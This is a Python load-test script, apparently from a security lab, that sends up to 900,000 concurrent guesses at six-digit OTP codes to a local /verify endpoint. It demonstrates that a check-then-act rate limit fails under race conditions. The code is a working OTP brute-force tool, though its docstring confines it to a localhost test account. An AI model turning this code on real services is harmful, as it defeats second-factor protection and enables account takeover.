#!/usr/bin/env python3
"""
Python port of load-test-otp.js.

Drives ../01-content-length-framing/server.js's /verify endpoint with
high concurrency to probe whether its check-then-act rate limit
(attempts >= 5) actually holds under concurrent callers. See
./README.md for what this is demonstrating and why.

Usage:
    python3 load_test_otp.py [--total 900000] [--concurrency 100]

Scope: localhost only, against the lab server in this repo with its
seeded in-memory test account. Not a general-purpose brute-force tool.
"""
import argparse
import http.client
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "127.0.0.1"
PORT = 3000
START_CANDIDATE = 100_000
END_CANDIDATE = 999_999


def verify(candidate: int) -> int:
    body = json.dumps({"username": "salim", "code": str(candidate)})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        conn.request(
            "POST",
            "/verify",
            body=body,
            headers={
                "Content-Type": "application/json",
                "Content-Length": str(len(body)),
            },
        )
        resp = conn.getresponse()
        resp.read()
        return resp.status
    finally:
        conn.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--total", type=int, default=900_000)
    parser.add_argument("--concurrency", type=int, default=100)
    args = parser.parse_args()

    total = min(args.total, END_CANDIDATE - START_CANDIDATE + 1)
    start = time.perf_counter()

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {
            pool.submit(verify, START_CANDIDATE + i): START_CANDIDATE + i
            for i in range(total)
        }
        for future in as_completed(futures):
            candidate = futures[future]
            try:
                status = future.result()
            except Exception as exc:  # noqa: BLE001 - report and continue
                print(f"candidate={candidate} error={exc}")
                continue
            if status != 200:
                print(f"candidate={candidate} status={status}")

    elapsed = time.perf_counter() - start
    print(f"Completed: {total}")
    print(f"Concurrency: {args.concurrency}")
    print(f"Time: {elapsed * 1000:.2f} ms")
    print(f"Throughput: {total / elapsed:.2f} req/s")


if __name__ == "__main__":
    main()
